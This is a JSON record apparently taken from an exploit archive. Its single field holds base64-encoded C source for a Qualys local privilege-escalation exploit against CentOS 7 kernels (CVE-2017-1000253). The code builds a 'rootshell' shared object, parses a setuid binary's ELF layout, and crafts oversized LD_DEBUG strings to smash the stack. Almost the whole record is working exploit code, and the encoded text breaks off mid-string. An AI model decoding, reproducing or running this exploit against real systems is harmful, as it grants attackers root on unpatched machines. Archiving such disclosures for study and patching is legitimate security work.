{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIENWRS0yMDE3LTEwMDAyNTMuYyAtIGFuIGV4cGxvaXQgZm9yIENlbnRPUy03IGtlcm5lbCB2ZXJzaW9ucw0KICogMy4xMC4wLTUxNC4yMS4yLmVsNy54ODZfNjQgYW5kIDMuMTAuMC01MTQuMjYuMS5lbDcueDg2XzY0DQogKiBDb3B5cmlnaHQgKEMpIDIwMTcgUXVhbHlzLCBJbmMuDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAqIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMgcHVibGlzaGVkIGJ5DQogKiB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcg0KICogKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAqIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mDQogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogKiBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KICoNCiAqIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4NCiogDQoqIEUtREIgTm90ZTogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA5LzI2L2xpbnV4LXBpZS1jdmUtMjAxNy0xMDAwMjUzL2N2ZS0yMDE3LTEwMDAyNTMudHh0DQoqIEUtREIgTm90ZTogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA5LzI2L2xpbnV4LXBpZS1jdmUtMjAxNy0xMDAwMjUzL2N2ZS0yMDE3LTEwMDAyNTMuYw0KKiBFLURCIE5vdGU6IGh0dHA6Ly9zZWNsaXN0cy5vcmcvb3NzLXNlYy8yMDE3L3EzLzU0MQ0KKi8NCg0KLyoqDQpjYXQgPiByb290c2hlbGwuYyA8PCAiRU9GIg0KI2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPGxpbnV4L2NhcGFiaWxpdHkuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2RlZmluZSBkaWUoKSBleGl0KF9fTElORV9fKQ0Kc3RhdGljIHZvaWQgX19hdHRyaWJ1dGVfXyAoKGNvbnN0cnVjdG9yKSkgc3RhdHVzKHZvaWQpIHsNCiAgICBpZiAoZHVwMihTVERJTl9GSUxFTk8sIFNURE9VVF9GSUxFTk8pICE9IFNURE9VVF9GSUxFTk8pIGRpZSgpOw0KICAgIGlmIChkdXAyKFNURElOX0ZJTEVOTywgU1RERVJSX0ZJTEVOTykgIT0gU1RERVJSX0ZJTEVOTykgZGllKCk7DQogICAgY29uc3QgcGlkX3QgcGlkID0gZ2V0cGlkKCk7DQogICAgaWYgKHBpZCA8PSAwKSBkaWUoKTsNCiAgICBwcmludGYoIlBpZDoJJXp1CiIsIChzaXplX3QpcGlkKTsNCiAgICB1aWRfdCBydWlkLCBldWlkLCBzdWlkOw0KICAgIGdpZF90IHJnaWQsIGVnaWQsIHNnaWQ7DQogICAgaWYgKGdldHJlc3VpZCgmcnVpZCwgJmV1aWQsICZzdWlkKSkgZGllKCk7DQogICAgaWYgKGdldHJlc2dpZCgmcmdpZCwgJmVnaWQsICZzZ2lkKSkgZGllKCk7DQogICAgcHJpbnRmKCJVaWQ6CSV6dQklenUJJXp1CiIsIChzaXplX3QpcnVpZCwgKHNpemVfdClldWlkLCAoc2l6ZV90KXN1aWQpOw0KICAgIHByaW50ZigiR2lkOgklenUJJXp1CSV6dQoiLCAoc2l6ZV90KXJnaWQsIChzaXplX3QpZWdpZCwgKHNpemVfdClzZ2lkKTsNCiAgICBzdGF0aWMgc3RydWN0IF9fdXNlcl9jYXBfaGVhZGVyX3N0cnVjdCBoZWFkZXI7DQogICAgaWYgKGNhcGdldCgmaGVhZGVyLCBOVUxMKSkgZGllKCk7DQogICAgaWYgKGhlYWRlci52ZXJzaW9uIDw9IDApIGRpZSgpOw0KICAgIGhlYWRlci5waWQgPSBwaWQ7DQogICAgc3RhdGljIHN0cnVjdCBfX3VzZXJfY2FwX2RhdGFfc3RydWN0IGRhdGFbMl07DQogICAgaWYgKGNhcGdldCgmaGVhZGVyLCBkYXRhKSkgZGllKCk7DQogICAgcHJpbnRmKCJDYXBJbmg6CSUwOHglMDh4CiIsIGRhdGFbMV0uaW5oZXJpdGFibGUsIGRhdGFbMF0uaW5oZXJpdGFibGUpOw0KICAgIHByaW50ZigiQ2FwUHJtOgklMDh4JTA4eAoiLCBkYXRhWzFdLnBlcm1pdHRlZCwgZGF0YVswXS5wZXJtaXR0ZWQpOw0KICAgIHByaW50ZigiQ2FwRWZmOgklMDh4JTA4eAoiLCBkYXRhWzFdLmVmZmVjdGl2ZSwgZGF0YVswXS5lZmZlY3RpdmUpOw0KICAgIGZmbHVzaChzdGRvdXQpOw0KICAgIGZvciAoOzspIHNsZWVwKDEwKTsNCiAgICBkaWUoKTsNCn0NCkVPRg0KZ2NjIC1mcGljIC1zaGFyZWQgLW5vc3RhcnRmaWxlcyAtT3MgLXMgLW8gcm9vdHNoZWxsIHJvb3RzaGVsbC5jDQp4eGQgLWkgcm9vdHNoZWxsID4gcm9vdHNoZWxsLmgNCioqLw0KDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8ZWxmLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxsaW5rLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2RlZmluZSBtZW1wc2V0KF9zLCBfYywgX24pIChtZW1zZXQoKF9zKSwgKF9jKSwgKF9uKSkgKyAoX24pKQ0KDQojZGVmaW5lIFBBR0VTWiAoKHNpemVfdCk0MDk2KQ0KI2RlZmluZSBTVEFDS19BTElHTiAoKHNpemVfdCkxNikNCiNkZWZpbmUgU1VCX1NUQUNLX1JBTkQgKChzaXplX3QpODE5MikNCiNkZWZpbmUgU0FGRV9TVEFDS19TSVpFICgoc2l6ZV90KTI0PDwxMCkNCiNkZWZpbmUgTUFYX0FSR19TVFJMRU4gKChzaXplX3QpMTI4PDwxMCkNCg0KI2RlZmluZSBJTklUX1NUQUNLX0VYUCAoMTMxMDcyVUwpDQojZGVmaW5lIFNUQUNLX0dVQVJEX0dBUCAoMVVMPDwyMCkNCiNkZWZpbmUgTUlOX0dBUCAoMTI4KjEwMjQqMTAyNFVMICsgKCgoLTFVTCkgJiAweDNmZmZmZikgPDwgMTIpKQ0KDQojZGVmaW5lIExEU08gIi9saWI2NC9sZC1saW51eC14ODYtNjQuc28uMiINCiNkZWZpbmUgTERTT19PRkZTRVQgKChzaXplX3QpMHgyMzgpDQoNCiNkZWZpbmUgZGllKCkgZG8geyBcDQogICAgcHJpbnRmKCJkaWVkIGluICVzOiAldQoiLCBfX2Z1bmNfXywgX19MSU5FX18pOyBcDQogICAgZXhpdChFWElUX0ZBSUxVUkUpOyBcDQp9IHdoaWxlICgwKQ0KDQpzdGF0aWMgY29uc3QgRWxmVyhhdXh2X3QpICogbXlfYXV4djsNCg0Kc3RhdGljIHVuc2lnbmVkIGxvbmcgaW50DQpteV9nZXRhdXh2YWwgKGNvbnN0IHVuc2lnbmVkIGxvbmcgaW50IHR5cGUpDQp7DQogICAgY29uc3QgRWxmVyhhdXh2X3QpICogcDsNCg0KICAgIGlmICghbXlfYXV4dikgZGllKCk7DQogICAgZm9yIChwID0gbXlfYXV4djsgcC0+YV90eXBlICE9IEFUX05VTEw7IHArKykNCiAgICAgICAgaWYgKHAtPmFfdHlwZSA9PSB0eXBlKQ0KICAgICAgICAgICAgcmV0dXJuIHAtPmFfdW4uYV92YWw7DQogICAgZGllKCk7DQp9DQoNCnN0cnVjdCBlbGZfaW5mbyB7DQogICAgdWludHB0cl90IHJ4X3N0YXJ0LCByeF9lbmQ7DQogICAgdWludHB0cl90IHJ3X3N0YXJ0LCByd19lbmQ7DQogICAgdWludHB0cl90IGR5bmFtaWNfc3RhcnQ7DQogICAgdWludHB0cl90IGRhdGFfc3RhcnQ7DQp9Ow0KDQpzdGF0aWMgc3RydWN0IGVsZl9pbmZvDQpnZXRfZWxmX2luZm8oY29uc3QgY2hhciAqIGNvbnN0IGJpbmFyeSkNCnsNCiAgICBzdHJ1Y3QgZWxmX2luZm8gZWxmOw0KICAgIG1lbXNldCgmZWxmLCAwLCBzaXplb2YoZWxmKSk7DQoNCiAgICBjb25zdCBpbnQgZmQgPSBvcGVuKGJpbmFyeSwgT19SRE9OTFkpOw0KICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQogICAgc3RydWN0IHN0YXQgc3Q7DQogICAgaWYgKGZzdGF0KGZkLCAmc3QpKSBkaWUoKTsNCiAgICBpZiAoIVNfSVNSRUcoc3Quc3RfbW9kZSkpIGRpZSgpOw0KICAgIGlmIChzdC5zdF9zaXplIDw9IDApIGRpZSgpOw0KICAgICNkZWZpbmUgU0FGRVNaICgoc2l6ZV90KTY0PDwyMCkNCiAgICBpZiAoc3Quc3Rfc2l6ZSA+PSAoc3NpemVfdClTQUZFU1opIGRpZSgpOw0KICAgIGNvbnN0IHNpemVfdCBzaXplID0gc3Quc3Rfc2l6ZTsNCiAgICB1aW50OF90ICogY29uc3QgYnVmID0gbWFsbG9jKHNpemUpOw0KICAgIGlmICghYnVmKSBkaWUoKTsNCiAgICBpZiAocmVhZChmZCwgYnVmLCBzaXplKSAhPSAoc3NpemVfdClzaXplKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UoZmQpKSBkaWUoKTsNCg0KICAgIGlmIChzaXplIDw9IExEU09fT0ZGU0VUICsgc2l6ZW9mKExEU08pKSBkaWUoKTsNCiAgICBpZiAobWVtY21wKGJ1ZiArIExEU09fT0ZGU0VULCBMRFNPLCBzaXplb2YoTERTTykpKSBkaWUoKTsNCg0KICAgIGlmIChzaXplIDw9IHNpemVvZihFbGZXKEVoZHIpKSkgZGllKCk7DQogICAgY29uc3QgRWxmVyhFaGRyKSAqIGNvbnN0IGVoZHIgPSAoY29uc3QgRWxmVyhFaGRyKSAqKWJ1ZjsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcwXSAhPSBFTEZNQUcwKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcxXSAhPSBFTEZNQUcxKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUcyXSAhPSBFTEZNQUcyKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9NQUczXSAhPSBFTEZNQUczKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9pZGVudFtFSV9DTEFTU10gIT0gRUxGQ0xBU1M2NCkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfaWRlbnRbRUlfREFUQV0gIT0gRUxGREFUQTJMU0IpIGRpZSgpOw0KICAgIGlmIChlaGRyLT5lX3R5cGUgIT0gRVRfRFlOKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9tYWNoaW5lICE9IEVNX1g4Nl82NCkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfdmVyc2lvbiAhPSBFVl9DVVJSRU5UKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9laHNpemUgIT0gc2l6ZW9mKEVsZlcoRWhkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9waGVudHNpemUgIT0gc2l6ZW9mKEVsZlcoUGhkcikpKSBkaWUoKTsNCiAgICBpZiAoZWhkci0+ZV9waG9mZiA8PSAwIHx8IGVoZHItPmVfcGhvZmYgPj0gc2l6ZSkgZGllKCk7DQogICAgaWYgKGVoZHItPmVfcGhudW0gPiAoc2l6ZSAtIGVoZHItPmVfcGhvZmYpIC8gc2l6ZW9mKEVsZlcoUGhkcikpKSBkaWUoKTsNCg0KICAgIHVuc2lnbmVkIGludCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBlaGRyLT5lX3BobnVtOyBpKyspIHsNCiAgICAgICAgY29uc3QgRWxmVyhQaGRyKSAqIGNvbnN0IHBoZHIgPSAoY29uc3QgRWxmVyhQaGRyKSAqKShidWYgKyBlaGRyLT5lX3Bob2ZmKSArIGk7DQogICAgICAgIGlmIChwaGRyLT5wX3R5cGUgIT0gUFRfTE9BRCkgY29udGludWU7DQogICAgICAgIGlmIChwaGRyLT5wX29mZnNldCA+PSBzaXplKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfZmlsZXN6ID4gc2l6ZSAtIHBoZHItPnBfb2Zmc2V0KSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfZmlsZXN6ID4gcGhkci0+cF9tZW1zeikgZGllKCk7DQogICAgICAgIGlmIChwaGRyLT5wX3ZhZGRyICE9IHBoZHItPnBfcGFkZHIpIGRpZSgpOw0KICAgICAgICBpZiAocGhkci0+cF92YWRkciA+PSBTQUZFU1opIGRpZSgpOw0KICAgICAgICBpZiAocGhkci0+cF9tZW1zeiA+PSBTQUZFU1opIGRpZSgpOw0KICAgICAgICBpZiAocGhkci0+cF9tZW1zeiA8PSAwKSBkaWUoKTsNCiAgICAgICAgaWYgKHBoZHItPnBfYWxpZ24gIT0gMiAqIFNUQUNLX0dVQVJEX0dBUCkgZGllKCk7DQoNCiAgICAgICAgY29uc3QgdWludHB0cl90IHN0YXJ0ID0gcGhkci0+cF92YWRkciAmIH4oUEFHRVNaLTEpOw0KICAgICAgICBjb25zdCB1aW50cHRyX3QgZW5kID0gKHBoZHItPnBfdmFkZHIgKyBwaGRyLT5wX21lbXN6ICsgUEFHRVNaLTEpICYgfihQQUdFU1otMSk7DQogICAgICAgIGlmIChlbGYucndfZW5kKSBkaWUoKTsNCg0KICAgICAgICBzd2l0Y2ggKHBoZHItPnBfZmxhZ3MpIHsNCiAgICAgICAgICAgIGNhc2UgUEZfUiB8IFBGX1g6DQogICAgICAgICAgICAgICAgaWYgKGVsZi5yeF9lbmQpIGRpZSgpOw0KICAgICAgICAgICAgICAgIGlmIChwaGRyLT5wX3ZhZGRyKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBlbGYucnhfc3RhcnQgPSBzdGFydDsNCiAgICAgICAgICAgICAgICBlbGYucnhfZW5kID0gZW5kOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSBQRl9SIHwgUEZfVzoNCiAgICAgICAgICAgICAgICBpZiAoIWVsZi5yeF9lbmQpIGRpZSgpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydCA8PSBlbGYucnhfZW5kKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBlbGYucndfc3RhcnQgPSBzdGFydDsNCiAgICAgICAgICAgICAgICBlbGYucndfZW5kID0gZW5kOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoIWVsZi5yeF9lbmQpIGRpZSgpOw0KICAgIGlmICghZWxmLnJ3X2VuZCkgZGllKCk7DQoNCiAgICB1aW50cHRyX3QgX2R5bmFtaWMgPSAwOw0KICAgIHVpbnRwdHJfdCBfZGF0YSA9IDA7DQogICAgdWludHB0cl90IF9ic3MgPSAwOw0KDQogICAgZm9yIChpID0gMDsgaSA8IGVoZHItPmVfc2hudW07IGkrKykgew0KICAgICAgICBjb25zdCBFbGZXKFNoZHIpICogY29uc3Qgc2hkciA9IChjb25zdCBFbGZXKFNoZHIpICopKGJ1ZiArIGVoZHItPmVfc2hvZmYpICsgaTsNCiAgICAgICAgaWYgKCEoc2hkci0+c2hfZmxhZ3MgJiBTSEZfQUxMT0MpKSBjb250aW51ZTsNCiAgICAgICAgaWYgKHNoZHItPnNoX2FkZHIgPD0gMCB8fCBzaGRyLT5zaF9hZGRyID49IFNBRkVTWikgZGllKCk7DQogICAgICAgIGlmIChzaGRyLT5zaF9zaXplIDw9IDAgfHwgc2hkci0+c2hfc2l6ZSA+PSBTQUZFU1opIGRpZSgpOw0KICAgICAgICAjdW5kZWYgU0FGRVNaDQogICAgICAgIGNvbnN0IHVpbnRwdHJfdCBzdGFydCA9IHNoZHItPnNoX2FkZHI7DQogICAgICAgIGNvbnN0IHVpbnRwdHJfdCBlbmQgPSBzdGFydCArIHNoZHItPnNoX3NpemU7DQoNCiAgICAgICAgaWYgKCEoc2hkci0+c2hfZmxhZ3MgJiBTSEZfV1JJVEUpKSB7DQogICAgICAgICAgICBpZiAoc3RhcnQgPCBlbGYucndfZW5kICYmIGVuZCA+IGVsZi5yd19zdGFydCkgZGllKCk7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoc3RhcnQgPCBlbGYucndfc3RhcnQgfHwgZW5kID4gZWxmLnJ3X2VuZCkgZGllKCk7DQogICAgICAgIGlmIChfYnNzKSBkaWUoKTsNCg0KICAgICAgICBzd2l0Y2ggKHNoZHItPnNoX3R5cGUpIHsNCiAgICAgICAgICAgIGNhc2UgU0hUX1BST0dCSVRTOg0KICAgICAgICAgICAgICAgIGlmIChzdGFydCA8PSBfZGF0YSkgZGllKCk7DQogICAgICAgICAgICAgICAgX2RhdGEgPSBzdGFydDsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgU0hUX05PQklUUzoNCiAgICAgICAgICAgICAgICBpZiAoIV9kYXRhKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBfYnNzID0gc3RhcnQ7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlIFNIVF9EWU5BTUlDOg0KICAgICAgICAgICAgICAgIGlmIChzaGRyLT5zaF9lbnRzaXplICE9IHNpemVvZihFbGZXKER5bikpKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBpZiAoX2R5bmFtaWMpIGRpZSgpOw0KICAgICAgICAgICAgICAgIF9keW5hbWljID0gc3RhcnQ7DQogICAgICAgICAgICAgICAgLyogZmFsbCB0aHJvdWdoICovDQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgIF9kYXRhID0gMDsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbGYuZHluYW1pY19zdGFydCA9IF9keW5hbWljOw0KICAgIGVsZi5kYXRhX3N0YXJ0ID0gX2RhdGE7DQogICAgaWYgKCFfZHluYW1pYykgZGllKCk7DQogICAgaWYgKCFfZGF0YSkgZGllKCk7DQogICAgaWYgKCFfYnNzKSBkaWUoKTsNCiAgICBmcmVlKGJ1Zik7DQogICAgcmV0dXJuIGVsZjsNCn0NCg0KaW50DQptYWluKGNvbnN0IGludCBteV9hcmdjLCBjb25zdCBjaGFyICogY29uc3QgbXlfYXJndltdLCBjb25zdCBjaGFyICogY29uc3QgbXlfZW52cFtdKQ0Kew0KICB7DQogICAgY29uc3QgY2hhciAqIGNvbnN0ICogcCA9IG15X2VudnA7DQogICAgd2hpbGUgKCpwKyspIDsNCiAgICBteV9hdXh2ID0gKGNvbnN0IHZvaWQgKilwOw0KICB9DQogICAgaWYgKG15X2dldGF1eHZhbChBVF9QQUdFU1opICE9IFBBR0VTWikgZGllKCk7DQogIHsNCiAgICBjb25zdCBjaGFyICogY29uc3QgcGxhdGZvcm0gPSAoY29uc3Qgdm9pZCAqKW15X2dldGF1eHZhbChBVF9QTEFURk9STSk7DQogICAgaWYgKCFwbGF0Zm9ybSkgZGllKCk7DQogICAgaWYgKHN0cmNtcChwbGF0Zm9ybSwgIng4Nl82NCIpKSBkaWUoKTsNCiAgfQ0KICAgIGlmIChteV9hcmdjICE9IDIpIHsNCiAgICAgICAgcHJpbnRmKCJVc2FnZTogJXMgYmluYXJ5CiIsIG15X2FyZ3ZbMF0pOw0KICAgICAgICBkaWUoKTsNCiAgICB9DQogICAgY29uc3QgY2hhciAqIGNvbnN0IGJpbmFyeSA9IHJlYWxwYXRoKG15X2FyZ3ZbMV0sIE5VTEwpOw0KICAgIGlmICghYmluYXJ5KSBkaWUoKTsNCiAgICBpZiAoKmJpbmFyeSAhPSAnLycpIGRpZSgpOw0KICAgIGlmIChhY2Nlc3MoYmluYXJ5LCBSX09LIHwgWF9PSykpIGRpZSgpOw0KICAgIGNvbnN0IHN0cnVjdCBlbGZfaW5mbyBlbGYgPSBnZXRfZWxmX2luZm8oYmluYXJ5KTsNCiAgICBpZiAoZWxmLnJ4X3N0YXJ0KSBkaWUoKTsNCg0KICAgIGlmIChzaXplb2YoRWxmVyhEeW4pKSAhPSBTVEFDS19BTElHTikgZGllKCk7DQogICAgaWYgKGVsZi5keW5hbWljX3N0YXJ0ICUgU1RBQ0tfQUxJR04gIT0gU1RBQ0tfQUxJR04gLyAyKSBkaWUoKTsNCg0KICAgIGNvbnN0IHVpbnRwdHJfdCBhcmdfc3RhcnQgPSBlbGYucnhfZW5kICsgMiAqIFNUQUNLX0dVQVJEX0dBUCArIElOSVRfU1RBQ0tfRVhQICsgUEFHRVNaLTE7DQogICAgaWYgKGFyZ19zdGFydCA+PSBlbGYucndfZW5kKSBkaWUoKTsNCg0KICAgIGNvbnN0IHNpemVfdCBhcmd2X3NpemUgPSAoYXJnX3N0YXJ0IC0gZWxmLmRhdGFfc3RhcnQpIC0gKFNBRkVfU1RBQ0tfU0laRSArIDgqOCsyMioyKjgrMTYrNCpTVEFDS19BTElHTiArIFNVQl9TVEFDS19SQU5EKTsNCiAgICBwcmludGYoImFyZ3Zfc2l6ZSAlenUKIiwgYXJndl9zaXplKTsNCiAgICBpZiAoYXJndl9zaXplID49IGFyZ19zdGFydCkgZGllKCk7DQoNCiAgICBjb25zdCBzaXplX3QgYXJnMF9zaXplID0gZWxmLnJ3X2VuZCAtIGFyZ19zdGFydDsNCiAgICBpZiAoYXJnMF9zaXplICUgUEFHRVNaICE9IDEpIGRpZSgpOw0KDQogICAgY29uc3Qgc2l6ZV90IG5wYWRzID0gYXJndl9zaXplIC8gc2l6ZW9mKGNoYXIgKik7DQogICAgaWYgKG5wYWRzIDw9IGFyZzBfc2l6ZSkgZGllKCk7DQoNCiAgICBjb25zdCBzaXplX3Qgc21hc2hfc2l6ZSA9IChlbGYuZGF0YV9zdGFydCAtIGVsZi5yd19zdGFydCkgKyBTQUZFX1NUQUNLX1NJWkUgKyBTVUJfU1RBQ0tfUkFORDsNCiAgICBpZiAoc21hc2hfc2l6ZSA+PSAoZWxmLnJ3X3N0YXJ0IC0gZWxmLnJ4X2VuZCkgLSBTVEFDS19HVUFSRF9HQVApIGRpZSgpOw0KICAgIGlmIChzbWFzaF9zaXplICsgMTAyNCA+PSBNQVhfQVJHX1NUUkxFTikgZGllKCk7DQogICAgcHJpbnRmKCJzbWFzaF9zaXplICV6dQoiLCBzbWFzaF9zaXplKTsNCg0KICAgIGNvbnN0IHNpemVfdCBoaV9zbWFzaF9zaXplID0gKFNBRkVfU1RBQ0tfU0laRSAqIDMgLyA0KSAmIH4oU1RBQ0tfQUxJR04tMSk7DQogICAgcHJpbnRmKCJoaV9zbWFzaF9zaXplICV6dQoiLCBoaV9zbWFzaF9zaXplKTsNCiAgICBpZiAoaGlfc21hc2hfc2l6ZSA8PSBTVEFDS19BTElHTikgZGllKCk7DQogICAgaWYgKGhpX3NtYXNoX3NpemUgPj0gc21hc2hfc2l6ZSkgZGllKCk7DQoNCiAgICBjb25zdCBzaXplX3QgbG9fc21hc2hfc2l6ZSA9IChzbWFzaF9zaXplIC0gaGlfc21hc2hfc2l6ZSkgJiB+KFNUQUNLX0FMSUdOLTEpOw0KICAgIHByaW50ZigibG9fc21hc2hfc2l6ZSAlenUKIiwgbG9fc21hc2hfc2l6ZSk7DQogICAgaWYgKGxvX3NtYXNoX3NpemUgPD0gU1RBQ0tfQUxJR04pIGRpZSgpOw0KDQogICAgI2RlZmluZSBMRF9ERUJVR18gIkxEX0RFQlVHPSINCiAgICBzdGF0aWMgY2hhciBmb3JlZ3JvdW5kW01BWF9BUkdfU1RSTEVOXTsNCiAgew0KICAgIGNoYXIgKiBjcCA9IHN0cGNweShmb3JlZ3JvdW5kLCBMRF9ERUJVR18pOw0KICAgIGNwID0gbWVtcHNldChjcCwgJ0EnLCBoaV9zbWFzaF9zaXplIC0gMTYpOw0KICAgIGNwID0gbWVtcHNldChjcCwgJyAnLCAxKTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICdBJywgMjQpOw0KICAgIGNwID0gbWVtcHNldChjcCwgJyAnLCAxKTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICdBJywgMSk7DQogICAgY3AgPSBtZW1wc2V0KGNwLCAnICcsIERUX1NZTVRBQiArIDE2IC0gKDI0KzEgKyAxICsgRFRfTkVFREVEKSAlIDE2KTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICdBJywgODApOw0KICAgIGNwID0gbWVtcHNldChjcCwgJyAnLCAxNik7DQogICAgY3AgPSBtZW1wc2V0KGNwLCAnQScsIDMxKTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICcgJywgMSk7DQogICAgY3AgPSBtZW1wc2V0KGNwLCAnQScsIDEpOw0KICAgIGNwID0gbWVtcHNldChjcCwgJyAnLCBEVF9ORUVERUQgKyAxNiAtICgzMSsxICsgMSArIERUX1NUUlRBQikgJSAxNik7DQogICAgY3AgPSBtZW1wc2V0KGNwLCAnQScsIDgwKTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICcgJywgMTYpOw0KICAgIGNwID0gbWVtcHNldChjcCwgJ0EnLCAzMSk7DQogICAgY3AgPSBtZW1wc2V0KGNwLCAnICcsIDEpOw0KICAgIGNwID0gbWVtcHNldChjcCwgJ0EnLCAxKTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICcgJywgRFRfU1RSVEFCICsgMTYgLSAoMzErMSArIDEgKyAxICsgc3RybGVuKGJpbmFyeSkrMSArIHNpemVvZih2b2lkICopKSAlIDE2KTsNCiAgICBjcCA9IG1lbXBzZXQoY3AsICdBJywgbG9fc21hc2hfc2l6ZSAtIDE2KTsNCiAgICBpZiAoY3AgPj0gZm9yZWdyb3VuZCArIHNpemVvZihmb3JlZ3JvdW5kKSkgZGllKCk7DQogICAgaWYgKGNwIDw9IGZvcmVncm91bmQpIGRpZSgpOw0KICAgIGlmICgqY3ApIGRpZSgpOw0KICAgIGlmIChzdHJsZW4oZm9yZWdyb3VuZCkgIT0gKHNpemVfdCkoY3AgLSBmb3JlZ3JvdW5kKSkgZGllKCk7DQogIH0NCiAgICBzdGF0aWMgY2hhciBiYWNrZ3JvdW5kW01BWF9BUkdfU1RSTEVOXTsNCiAgew0KICAgIGNoYXIgKiBjcCA9IHN0cGNweShiYWNrZ3JvdW5kLCBMRF9ERUJVR18pOw0KICAgIGNwID0gbWVtcHNldChjcCwgJ0wnLCBsb19zbWFzaF9zaXplKTsNCiAgICBzaXplX3QgaTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgKDMyICsgNDggKyA5NikgLyBzaXplb2YodWludDY0X3QpOyBpKyspIHsNCiAgICAgICAgY29uc3QgdWludDY0X3Qgc3RydGFiID0gMHg4ODg4ODg4ODg4ODg4ODg4VUwgKyAwOw0KICAgICAgICBjcCA9IG1lbXBjcHkoY3AsICZzdHJ0YWIsIHNpemVvZih1aW50NjRfdCkpOw0KICAgIH0NCiAgICBmb3IgKGkgPSAwOyBpIDwgKDMyICsgNDggKyA5NikgLyBzaXplb2YodWludDY0X3QpOyBpKyspIHsNCiAgICAgICAgY29uc3QgdWludDY0X3QgbmVlZGVkID0gMHg3Nzc3Nzc3Nzc3Nzc3Nzc4VUwgKyBMRFNPX09GRlNFVCsxOw0KICAgICAgICBjcCA9IG1lbXBjcHkoY3AsICZuZWVkZWQsIHNpemVvZih1aW50NjRfdCkpOw0KICAgIH0NCiAgICBjcCA9IG1lbXBzZXQoY3AsICdIJywgMzIgKyA0OCArIGhpX3NtYXNoX3NpemUgLSAxNik7DQogI